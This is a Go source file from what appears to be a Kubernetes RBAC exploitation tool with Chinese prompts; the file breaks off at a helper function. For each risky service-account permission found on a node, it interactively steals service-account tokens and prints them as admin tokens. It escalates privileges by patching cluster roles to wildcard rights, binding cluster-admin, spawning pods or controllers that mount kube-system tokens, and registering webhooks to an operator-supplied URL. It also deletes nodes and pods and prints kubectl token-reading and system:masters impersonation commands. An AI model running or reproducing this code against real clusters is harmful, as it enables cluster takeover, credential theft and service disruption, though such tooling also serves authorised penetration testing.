package exploit

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	exp "k8sRBACdetect/pkg/exploit/utils"
	"k8sRBACdetect/pkg/request"
	"k8sRBACdetect/pkg/scan"
	"k8sRBACdetect/structure"
	"log"
	"math/rand"
	"reflect"
	"sort"
	"strconv"
	"strings"
	"time"

	coreV1 "k8s.io/api/core/v1"
	metaV1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func Patchwebhookconfig(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check1(criticalSAs, []string{"patchmutatingwebhookconfigurations", "patchvalidatingwebhookconfigurations"})
	if flag1 {
		webhookconfigType := ""
		for _, criticalSA := range criticalSAs1 {
			webhookconfigType = criticalSA.SA.Type[5:]
			flag := "N"
			fmt.Print("[Y/N] 检测到", criticalSA.SA.Type, "是否Patch webhookconfig: ")
			fmt.Scan(&flag)
			if strings.ToUpper(flag) == "Y" {
				webhookconfigName := ""
				webhookURL := ""
				ca := ""
				fmt.Println("[input] 输入一个WebHookConfigName")
				fmt.Scan(&webhookconfigName)
				fmt.Print("[input] 输入webhookURL: ")
				fmt.Scan(&webhookURL)
				fmt.Println("[input] 输入ca")
				fmt.Scan(&ca)
				token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
				if err != nil {
					fmt.Println("[X] 文件读取错误")
					fmt.Println("[error msg]:", err.Error())
				}
				err = exp.PatchWebhookConfig(token, webhookconfigType, webhookconfigName, webhookURL, ca)
				if err != nil {
					fmt.Println("[X] PatchWebhookConfig失败", err.Error())
				}
			}

		}
	}
	return false, nil
}
func Createwebhookconfig(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check1(criticalSAs, []string{"createmutatingwebhookconfigurations", "createvalidatingwebhookconfigurations"})
	if flag1 {
		webhookconfigType := ""
		for _, criticalSA := range criticalSAs1 {
			webhookconfigType = criticalSA.SA.Type[6:]
			flag := "N"
			fmt.Print("[Y/N] 检测到", criticalSA.SA.Type, "是否创建webhookconfig: ")
			fmt.Scan(&flag)
			if strings.ToUpper(flag) == "Y" {
				webhookURL := ""
				ca := ""
				fmt.Print("[input] 输入webhookURL: ")
				fmt.Scan(&webhookURL)
				fmt.Println("[input] 输入ca: ")
				fmt.Scan(&ca)
				token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
				if err != nil {
					fmt.Println("[X] 文件读取错误")
					fmt.Println("[error msg]:", err.Error())
				}
				err = exp.CreateWebhookConfig(token, webhookconfigType, webhookURL, ca)
				if err != nil {
					fmt.Println("[X] CreateWebhookConfig失败", err.Error())
				}
			}

		}
	}
	return false, nil
}
func WatchSecrets(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"watchsecrets"})
	if flag1 {
		fmt.Println("[√] 检测到watchsecrets权限")
		for _, criticalSA := range criticalSAs1 {
			fmt.Println("[msg] 该SA可watch的权限为: ", criticalSA.SA.Type)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 文件读取错误")
				fmt.Println("[error msg]:", err.Error())
			}
			fmt.Println("[msg] 该SAtoken为: \n", token)
			fmt.Println("---------------------------------------------------")
		}
		fmt.Println("[msg] 访问api/v1/secrets?watch")
	}
	return false, nil
}

func Impersonate(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"impersonate"})
	if flag1 {
		fmt.Println("[√] 检测到impersonate权限")
		for _, criticalSA := range criticalSAs1 {
			fmt.Println("[msg] 该SA具体信息:", criticalSA.SA.Type)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 文件读取错误")
				fmt.Println("[error msg]:", err.Error())
			}
			fmt.Println("[msg] 该SAtoken为: \n", token)
			fmt.Println("---------------------------------------------------")
		}
		fmt.Println("[msg] 使用kubectl时添加如下参数: --as any --as-group system:masters")
	}
	return false, nil
}
func Execpods(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"execpods"})
	if flag1 {
		fmt.Println("[√] 检测到create pods/exec 权限")
		for _, criticalSA := range criticalSAs1 {
			fmt.Println("[msg] 该SA可exec的pod为: ", criticalSA.SA.Type)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 文件读取错误")
				fmt.Println("[error msg]:", err.Error())
			}
			fmt.Println("[msg] 该SAtoken为: \n", token)
			fmt.Println("---------------------------------------------------")
		}
		fmt.Println("[msg] 使用kubectl获取pod中token:\nkubectl exec -it tmp  -- sh -c \"cat /var/run/secrets/kubernetes.io/serviceaccount/token\"")
	}
	return false, nil
}
func Execpods2(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"execpods2"})
	if flag1 {
		fmt.Println("[√] 检测到create pods/ephemeralcontainers 权限")
		for _, criticalSA := range criticalSAs1 {
			fmt.Println("[msg] 该SA可exec的pod为: ", criticalSA.SA.Type)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 文件读取错误")
				fmt.Println("[error msg]:", err.Error())
			}
			fmt.Println("[msg] 该SAtoken为: \n", token)
			fmt.Println("---------------------------------------------------")
		}
		fmt.Println("[msg] 使用kubectl进入ephemeralcontainer:\nkubectl debug -it tmp --image=busybox:1.28 --target=tmp")
	}
	return false, nil
}
func Deletepods(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"deletepods"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			flag := "N"
			var namespace string
			var podName string
			fmt.Println("[√] 检测到delete pods权限,权限范围为: ", criticalSA.SA.Type)
			fmt.Print("[Y/N] 是否删除该ns下的pod: ")
			fmt.Scan(&flag)
			if strings.ToUpper(flag) != "Y" {
				continue
			}
			fmt.Println("[input] 输入目标pod的ns与name(namespace podName)")
			fmt.Scan(&namespace)
			fmt.Scan(&podName)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 文件读取错误")
				fmt.Println("[error msg]:", err.Error())
			}
			err = exp.Deletepods(token, namespace, podName)
			if err != nil {
				fmt.Println("[X] delete pods时错误")
				fmt.Println("[error msg]:", err.Error())
			}
		}
		return true, nil
	}
	return false, nil
}
func Deletenodes(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"deletenodes"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			flag := "N"
			var node string
			fmt.Println("[√] 检测到delete nodes权限 ")
			fmt.Print("[Y/N] 是否删除node: ")
			fmt.Scan(&flag)
			if strings.ToUpper(flag) != "Y" {
				continue
			}
			fmt.Println("[input] 输入要删除的node")
			fmt.Scan(&node)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 文件读取错误")
				fmt.Println("[error msg]:", err.Error())
			}
			err = exp.Deletenodes(token, node)
			if err != nil {
				fmt.Println("[X] delete nodes时错误")
				fmt.Println("[error msg]:", err.Error())
			}
		}
		return true, nil
	}
	return false, nil
}
func Createpodeviction(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"createpodevictions"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			flag := "N"
			var namespace string
			var podName string
			fmt.Println("[√] 检测到createpodevictions权限,权限范围为: ", criticalSA.SA.Type)
			fmt.Println("[Y/N] 是否删除该ns下的pod")
			fmt.Scan(&flag)
			if strings.ToUpper(flag) != "Y" {
				continue
			}
			fmt.Println("[input] 输入目标pod的ns与name(namespace podName)")
			fmt.Scan(&namespace)
			fmt.Scan(&podName)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 文件读取错误")
				fmt.Println("[error msg]:", err.Error())
			}
			err = exp.CreatePodEviction(token, namespace, podName)
			if err != nil {
				fmt.Println("[X] evicted pods时错误")
				fmt.Println("[error msg]:", err.Error())
			}
		}
		return true, nil
	}
	return false, nil
}

func Patchpods(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, _ := Check(criticalSAs, []string{"execpods2"})
	if flag1 {
		fmt.Println("[msg] 制作恶意镜像获取pod SAtoken")
	}

	return false, nil
}

func Createtokens(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"createtokens"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			flag := "N" //如果ns非kube-system, 是否进行该ns 下的提权
			targetSa := "clusterrole-aggregation-controller"
			targetSaNamespace := "kube-system"
			flag2 := false
			if criticalSA.Level == "cluster" || criticalSA.SA.Type[12:] == "[kube-system]" {
				flag2 = true
			} else {
				targetSaNamespace = strings.Trim(criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):], "[]")
				fmt.Println("[!] 不具有kube-system下的createTokens权限, 该SA权限限制于: " + targetSaNamespace)
				fmt.Print("[Y/N] 是否进行该ns下的提权: ")
				fmt.Scan(&flag)
				if strings.ToUpper(flag) != "Y" {
					continue
				}
				fmt.Println("[input] 输入该namespace下的一个期望窃取的SA")
				fmt.Scan(&targetSa)
			}
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 文件读取错误")
				fmt.Println("[error msg]:", err.Error())
			}
			secret, err := exp.CreateToken(token, targetSaNamespace, targetSa)
			if err != nil {
				fmt.Println("[X] CreateToken错误")
				fmt.Println("[error msg]:", err.Error())
			} else {
				fmt.Println("[result]", "Admin token: \n"+secret)
			}
			if flag2 {
				return true, nil
			}
		}
		return true, nil
	}
	return false, nil
}
func Getsecrets(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"getsecrets"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			flag := "N"
			targetSa := "clusterrole-aggregation-controller"
			targetSaNamespace := "kube-system"
			flag2 := false
			if criticalSA.Level == "cluster" || criticalSA.SA.Type[10:] == "[kube-system]" {
				flag2 = true
			} else {
				targetSaNamespace = strings.Trim(criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):], "[]")
				fmt.Println("[!] 不具有kube-system下的getsecrets权限, 该SA权限限制于: " + targetSaNamespace)
				fmt.Print("[Y/N] 是否进行该ns下的提权: ")
				fmt.Scan(&flag)
				if strings.ToUpper(flag) != "Y" {
					continue
				}
				fmt.Print("[input] 输入该namespace下的一个期望窃取的SA: ")
				fmt.Scan(&targetSa)
			}
			if strings.Contains(criticalSA.SA.Type, "(") {
				resourceName := criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "(")+1 : strings.Index(criticalSA.SA.Type, ")")]
				if targetSa != resourceName {
					fmt.Println("[X] 存在resourceName限制, 只能窃取: ", resourceName)
					break
				}
			}
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 文件读取错误")
				fmt.Println("[error msg]:", err.Error())
			}
			secret, err := exp.GetSecrets(token, targetSa, targetSaNamespace)
			if err != nil {
				fmt.Println("[X] GetSecrets错误")
				fmt.Println("[error msg]:", err.Error())
			} else {
				fmt.Println("[result]", "Admin token: \n"+secret)
			}
			if flag2 {
				return true, nil
			}
		}
		return true, nil
	}
	fmt.Println("[X] Getsecrets失败, 未找到getsecrets权限")
	return false, nil
}

func Patchnodes(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag, criticalSAs1 := Check(criticalSAs, []string{"patchnodes"})
	if flag {
		var input string
		fmt.Print("[√] 检测到可用PatchNodes权限,是否进行Patch (Y/N): ")
		fmt.Scan(&input)
		if strings.ToUpper(input) == "Y" {
			token, err := scan.GetCriticalSAToken(criticalSAs1[0].SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 文件读取错误")
				fmt.Println("[error msg]:", err.Error())
				return false, err
			}
			err = exp.PatchNodes(token, ssh.Nodename)
			if err != nil {
				fmt.Println("[X] PatchNodes错误")
				fmt.Println("[error msg]:", err.Error())
			}
			fmt.Println("[√] 已Patch所有正常节点")
			fmt.Println("[msg] 需等待Pods重调度\n..........")
			time.Sleep(5 * time.Second)
			return true, nil
		}
	}
	fmt.Println("[X] Patchnodes失败, 未找到patchnodes权限")
	return false, nil
}

func Patchclusterrolebindings(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"patchclusterrolebindings"})
	if flag1 {
		var clusterrolebindingName string
		var saNamespace string
		var saName string
		fmt.Println("[√] 检测到patchclusterrolebindings, 准备提权")
		fmt.Print("[input] 输入一个将被Patch的clusterrolebinding名: ")
		fmt.Scan(&clusterrolebindingName)
		fmt.Print("[input] 输入要提权的账户(namespace sa): ")
		fmt.Scan(&saNamespace)
		fmt.Scan(&saName)
		token, err := scan.GetCriticalSAToken(criticalSAs1[0].SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 文件读取错误")
			fmt.Println("[error msg]:", err.Error())
		}
		err = exp.PatchClusterRoleBinding(token, clusterrolebindingName, saNamespace, saName)
		if err != nil {
			fmt.Println("[X] PatchClusterRoleBinding错误")
			fmt.Println("[error msg]:", err.Error())
			return false, err
		}
		return true, nil
	}
	fmt.Println("[X] Patchclusterrolebindings失败, 未找到Patchclusterrolebindings权限")
	return false, nil
}

// 将目标rolebinding中绑定的原SA替换为所控SA
func Patchrolebindings(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"patchrolebindings"})
	if flag1 {
		var rolebindingName string
		var saNamespace string
		var saName string
		fmt.Println("[√] 检测到patchrolebindings, 准备提权")
		fmt.Print("[input] 输入要提权的账户(namespace sa): ")
		fmt.Scan(&saNamespace)
		fmt.Scan(&saName)
		fmt.Print("[input] 输入该namespace下一个将被Patch的rolebinding名: ")
		fmt.Scan(&rolebindingName)
		for _, criticalSA := range criticalSAs1 {
			if criticalSA.SA.Crisa.Level == "cluster" || criticalSA.SA.Type[17:] == "["+saNamespace+"]" {
				token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
				if err != nil {
					fmt.Println("[X] 文件读取错误")
					fmt.Println("[error msg]:", err.Error())
				}
				err = exp.PatchRoleBinding(token, rolebindingName, saNamespace, saName)
				if err != nil {
					fmt.Println("[X] PatchRoleBinding错误")
					fmt.Println("[error msg]:", err.Error())
					return false, err
				}
				return true, nil
			}
		}
		fmt.Println("[X] 未找到该SANamespace下的patchrolebindings权限")
		return false, nil
	}
	fmt.Println("[X] Patchrolebindings失败, 未找到Patchrolebindings权限")
	return false, nil
}

// 将SA所绑定的ClusterRole中描述的权限升级为*.*
func Patchclusterroles(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"patchclusterroles"})
	if flag1 {
		var clusterroleName string
		fmt.Println("[√] 检测到patchclusterroles, 准备提权")
		fmt.Println("[input] 输入所控SA已绑定的clusterrole名")
		fmt.Scan(&clusterroleName)
		token, err := scan.GetCriticalSAToken(criticalSAs1[0].SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 文件读取错误")
			fmt.Println("[error msg]:", err.Error())
		}
		err = exp.PatchClusterRole(token, clusterroleName)
		if err != nil {
			fmt.Println("[X] PatchClusterRole错误")
			fmt.Println("[error msg]:", err.Error())
			return false, err
		}
		return true, nil
	}
	fmt.Println("[X] PatchClusterRole失败, 未找到patchclusterrole权限")
	return false, nil
}

// 将SA所绑定的Role中描述的权限升级为*.*
func Patchroles(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"patchroles"})
	if flag1 {
		var roleNamespace string
		var roleName string
		fmt.Println("[√] 检测到patchroles, 准备提权")
		fmt.Println("[input] 输入所控SA已绑定的roleNamespace 和 role名(namespace name)")
		fmt.Scan(&roleNamespace)
		fmt.Scan(&roleName)
		for _, criticalSA := range criticalSAs1 {
			if criticalSA.SA.Crisa.Level == "cluster" || criticalSA.SA.Type[10:] == "["+roleNamespace+"]" {
				token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
				if err != nil {
					fmt.Println("[X] 文件读取错误")
					fmt.Println("[error msg]:", err.Error())
				}
				err = exp.PatchRole(token, roleNamespace, roleName)
				if err != nil {
					fmt.Println("[X] PatchRole错误")
					fmt.Println("[error msg]:", err.Error())
					return false, err
				}
				return true, nil
			}
		}
		fmt.Println("[X] 未找到该roleNamespace下的patchroles权限")
		return false, nil

	}
	fmt.Println("[X] PatchRole失败, 未找到patchroles权限")
	return false, nil
}

func Patchpodcontrollers(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check1(criticalSAs, []string{"patchdeployments", "patchdaemonsets", "patchstatefulsets", "patchreplicasets", "patchjobs", "patchcronjobs"})
	if flag1 {
		controllerType := ""
		for _, criticalSA := range criticalSAs1 {
			flag := "N"
			namespace := "kube-system"
			controllerName := ""
			targetSA := "clusterrole-aggregation-controller"
			flag2 := false
			if criticalSA.Level == "cluster" || criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):] == "[kube-system]" {
				flag2 = true
			} else {
				namespace = strings.Trim(criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):], "[]")
				fmt.Println("[!] 不具有kube-system下的patchpodcontroller权限, 该SA权限限制于: " + namespace)
				fmt.Print("[Y/N] 是否进行该ns下的提权: ")
				fmt.Scan(&flag)
				if strings.ToUpper(flag) != "Y" {
					continue
				}
				fmt.Println("[input] 输入该namespace下的一个期望窃取的SA")
				fmt.Scan(&targetSA)
			}
			cnt := strings.Index(criticalSA.SA.Type, "[")
			if cnt == -1 {
				controllerType = criticalSA.SA.Type[5:]
			} else {
				controllerType = criticalSA.SA.Type[5:cnt]
			}
			fmt.Println("[input] 输入" + namespace + "下的一个podcontroller名: ")
			fmt.Scan(&controllerName)
			fmt.Println("[msg] 即将patch " + namespace + "/" + controllerName)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 文件读取错误")
				fmt.Println("[error msg]:", err.Error())
			}
			err = exp.PatchController(controllerType, token, namespace, controllerName, ssh.Nodename, targetSA, "hijack")
			if err != nil {
				fmt.Printf("[X] patchDeployments错误")
				fmt.Println("[error msg]:", err.Error())
			}
			if flag2 {
				return true, nil
			}
		}
		return true, nil
	}
	fmt.Println("[X] Patchpodcontrollers失败, 未找到patchpodcontrollers权限")
	return false, nil

}

func Createsecrets(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"createsecrets"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			flag := "N"
			targetSa := "clusterrole-aggregation-controller"
			targetSaNamespace := "kube-system"
			flag2 := false
			if criticalSA.Level == "cluster" || criticalSA.SA.Type[13:] == "[kube-system]" {
				flag2 = true
			} else {
				targetSaNamespace = strings.Trim(criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):], "[]")
				fmt.Println("[!] 不具有kube-system下的createsecrets权限, 该SA权限限制于: " + targetSaNamespace)
				fmt.Print("[Y/N] 是否进行该ns下的提权: ")
				fmt.Scan(&flag)
				if strings.ToUpper(flag) != "Y" {
					continue
				}
				fmt.Println("[input] 输入该namespace下的一个期望窃取的SA")
				fmt.Scan(&targetSa)
			}
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 文件读取错误")
				fmt.Println("[error msg]:", err.Error())
			}
			err = exp.CreateSecret(token, targetSa, targetSaNamespace)
			if err != nil {
				fmt.Println("[X] CreateSecret错误")
				fmt.Println("[error msg]:", err.Error())
			}
			time.Sleep(5 * time.Second)
			fmt.Println("[msg] 尝试通过getsecrets, 获取该secret")
			getsecrets(criticalSAs, targetSa, targetSaNamespace, ssh)
			if flag2 {
				return true, nil
			}
		}
		return true, nil
	}
	fmt.Println("[X] Createsecrets失败, 未找到createsecrets权限")
	return false, nil

}

func getsecrets(criticalSAs []structure.CriticalSA, targetSa string, targetSaNamespace string, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"getsecrets"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			if criticalSA.SA.Type[10:] == "["+targetSaNamespace+"]" {
				fmt.Println("[√] 检测到对应的getsecrets权限, 准备获取该secret")
				token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
				if err != nil {
					fmt.Println("[X] 文件读取错误")
					fmt.Println("[error msg]:", err.Error())
				}
				secret, err := exp.GetSecrets(token, targetSa, targetSaNamespace)
				if err != nil {
					fmt.Println("[X] GetSecrets错误")
					fmt.Println("[error msg]:", err.Error())
				} else {
					fmt.Println("[result]", "targetSA's token: \n"+secret)
				}
				return true, nil
			}
		}
	}
	fmt.Println("[X] Getsecrets失败, 未找到 [对应该Createsecrets的] getsecrets权限")
	return false, nil
}

func Createclusterrolebindings(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"createclusterrolebindings"})
	if flag1 {
		var saNamespace string
		var saName string
		fmt.Println("[√] 检测到createclusterrolebindings, 准备绑定cluster-admin")
		fmt.Println("[input] 输入要提权的账户(namespace sa): ")
		fmt.Scan(&saNamespace)
		fmt.Scan(&saName)
		token, err := scan.GetCriticalSAToken(criticalSAs1[0].SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 文件读取错误")
			fmt.Println("[error msg]:", err.Error())
		}
		err = exp.CreateClusterRoleBinding(token, saName, saNamespace, "Test")
		if err != nil {
			fmt.Println("[X] CreateClusterRoleBinding错误")
			fmt.Println("[error msg]:", err.Error())
			return false, err
		}
		return true, nil
	}
	fmt.Println("[X] Createclusterrolebindings失败, 未找到createclusterrolebindings权限")
	return false, nil
}

func Createrolebindings(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"createrolebindings"})
	if flag1 {
		var saNamespace string
		var roleName string
		var saName string
		fmt.Println("[√] 检测到patchroles, 准备提权")
		fmt.Print("[input] 输入所控SANamespace与SA名(namespace name): ")
		fmt.Scan(&saNamespace)
		fmt.Scan(&saName)
		fmt.Print("[input] 输入该ns下一个期望绑定的role名: ")
		fmt.Scan(&roleName)
		for _, criticalSA := range criticalSAs1 {
			if criticalSA.SA.Crisa.Level == "cluster" || criticalSA.SA.Type[18:] == "["+saNamespace+"]" {
				token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
				if err != nil {
					fmt.Println("[X] 文件读取错误")
					fmt.Println("[error msg]:", err.Error())
				}
				err = exp.CreateRoleBinding(token, saName, saNamespace, "testrolebinding", roleName)
				if err != nil {
					fmt.Println("[X] CreateRoleBinding错误")
					fmt.Println("[error msg]:", err.Error())
					return false, err
				}
				return true, nil
			}
		}
		fmt.Println("[X] 未检测到该SANamespace下的createrolebindings权限")
		return false, nil
	}
	fmt.Println("[X] CreateRoleBinding失败, 未找到createrolebindings权限")
	return false, nil
}

func Createpods(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"createpods"})
	if flag1 {
		rand.Seed(time.Now().UnixNano())
		randomNumber := rand.Intn(10000)
		var podName = "my-pod" + strconv.Itoa(randomNumber)
		for _, criticalSA := range criticalSAs1 {
			targetSa := "clusterrole-aggregation-controller"
			targetSaNamespace := "kube-system"
			flag := "N"
			flag2 := false
			if criticalSA.Level == "cluster" || criticalSA.SA.Type[10:] == "[kube-system]" {
				flag2 = true
			} else {
				targetSaNamespace = strings.Trim(criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):], "[]")
				fmt.Println("[!] 不具有kube-system下的createpods权限, 该SA权限限制于: " + targetSaNamespace)
				fmt.Print("[Y/N] 是否进行该ns下的提权: ")
				fmt.Scan(&flag)
				if strings.ToUpper(flag) != "Y" {
					continue
				}
				fmt.Println("[input] 输入该namespace下的一个期望窃取的SA")
				fmt.Scan(&targetSa)
			}
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 文件读取错误")
				fmt.Println("[error msg]:", err.Error())
				continue
			}
			err = exp.CreatePod(token, targetSaNamespace, podName, targetSa, ssh.Nodename)
			if err != nil {
				fmt.Println("[X] CreatePod错误")
				fmt.Println("[error msg]:", err.Error())
				continue
			}
			time.Sleep(2 * time.Second)
			clientset := request.GetClientSet("") //为空时默认使用工具账户
			targetPod, err := clientset.CoreV1().Pods(targetSaNamespace).Get(context.TODO(), podName, metaV1.GetOptions{})
			if err != nil {
				fmt.Println("[X] 未找到对应的getpods权限,无法获取所创建pod的uid")
				fmt.Println("[error msg]:", err)
				continue
			}
			tmpSa := structure.CriticalSA{
				SA0: structure.SA{
					SAPod: structure.Pod{
						Uid: string(targetPod.UID),
					},
				},
			}
			result, err := scan.GetCriticalSAToken(tmpSa, ssh)
			if err != nil {
				fmt.Println("[X] 读取所创建Pod挂载的SAToken时失败")
				fmt.Println("[error msg]:", err.Error())
			} else {
				fmt.Println("[result]", result)
			}
			if flag2 {
				return true, nil
			}
		}
		return true, nil
	}
	return false, nil
}

func Createpodcontrollers(criticalSAs []structure.CriticalSA, ssh structure.SSHConfig) (bool, error) {
	//自动化部分
	flag, criticalSAs1 := Check1(criticalSAs, []string{"createdeployments", "createdaemonsets", "createstatefulsets", "createreplicasets", "createjobs", "createcronjobs"})
	if flag {
		controllerType := ""
		rand.Seed(time.Now().UnixNano())
		randomNumber := rand.Intn(10000)
		var podControllerName = "my-pod" + strconv.Itoa(randomNumber)
		for _, criticalSA := range criticalSAs1 {
			flag := "N"
			flag2 := false
			targetSa := "clusterrole-aggregation-controller"
			targetSaNamespace := "kube-system"
			if criticalSA.Level == "cluster" || criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):] == "[kube-system]" {
				flag2 = true
			} else {
				targetSaNamespace = strings.Trim(criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):], "[]")
				fmt.Println("[!] 不具有kube-system下的createpodcontroller权限, 该SA权限限制于: " + targetSaNamespace)
				fmt.Print("[Y/N] 是否进行该ns下的提权: ")
				fmt.Scan(&flag)
				if strings.ToUpper(flag) != "Y" {
					continue
				}
				fmt.Println("[input] 输入该namespace下的一个期望窃取的SA")
				fmt.Scan(&targetSa)
			}
			cnt := strings.Index(criticalSA.SA.Type, "[")
			if cnt == -1 {
				controllerType = criticalSA.SA.Type[6:]
			} else {
				controllerType = criticalSA.SA.Type[6:cnt]
			}
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 文件读取错误")
				fmt.Println("[error msg]:", err.Error())
			}
			err = exp.CreatePodController(token, controllerType, targetSaNamespace, targetSa, podControllerName, ssh.Nodename)
			if err != nil {
				fmt.Println("[X] CreatePodController错误")
				fmt.Println("[error msg]:", err.Error())
			}

			if controllerType == "cronjobs" {
				fmt.Println("[!] 创建的是Cronjobs, 需要等待1分钟后获取token...")
				time.Sleep(65 * time.Second)
			} else {
				time.Sleep(2 * time.Second)
			}
			clientset := request.GetClientSet("")
			labelSelector := podControllerName + "=" + podControllerName
			pods, err := clientset.CoreV1().Pods(targetSaNamespace).List(context.TODO(), metaV1.ListOptions{
				LabelSelector: labelSelector,
			})
			if err != nil {
				fmt.Println("[X] 未找到对应的getpodcontroller权限,无法获取所创建pod的uid")
				fmt.Println(err)
				continue
			}
			var targetPod coreV1.Pod
			for _, pod := range pods.Items {
				targetPod = pod
			}
			tmpSa := structure.CriticalSA{
				SA0: structure.SA{
					SAPod: structure.Pod{
						Uid: string(targetPod.UID),
					},
				},
			}
			result, err := scan.GetCriticalSAToken(tmpSa, ssh)
			if err != nil {
				fmt.Println("[X] 读取所创建PodController挂载的SAToken时失败")
				fmt.Print("[error msg]:", err.Error())
			} else {
				fmt.Println("[result]", result)
			}

			if flag2 {
				return true, nil
			}

		}
		return true, nil
	}
	return false, nil
}

// 并型check
func Check(criticalSAs []structure.CriticalSA, permissionTypes []string) (bool, []filter) {
	var flag bool
	result := []filter{}
	for _, pt := range permissionTypes {
		flag = false
		for _, criticalSA := range criticalSAs {
			for _, criticalType := range criticalSA.Type {
				if strings.Contains(strings.ToUpper(criticalType), strings.ToUpper(pt)) && criticalSA.InNode == true {
					flag = true
					tmpcriticalSA := structure.CriticalSAWrapper{
						Type:  criticalType,
						Crisa: criticalSA,
					}
					result = append(result, filter{Level: criticalSA.Level, SA: tmpcriticalSA})
					break
				}
			}
		}
		//flag = false
	}
	sort.Slice(result, func(i, j int) bool {
		return result[i].Level < result[j].Level
	})
	return flag, result
}

type filter struct {
	Level string
	SA    structure.CriticalSAWrapper
}

// 或型check
func Check1(criticalSAs []structure.CriticalSA, permissionTypes []string) (bool, []filter) {
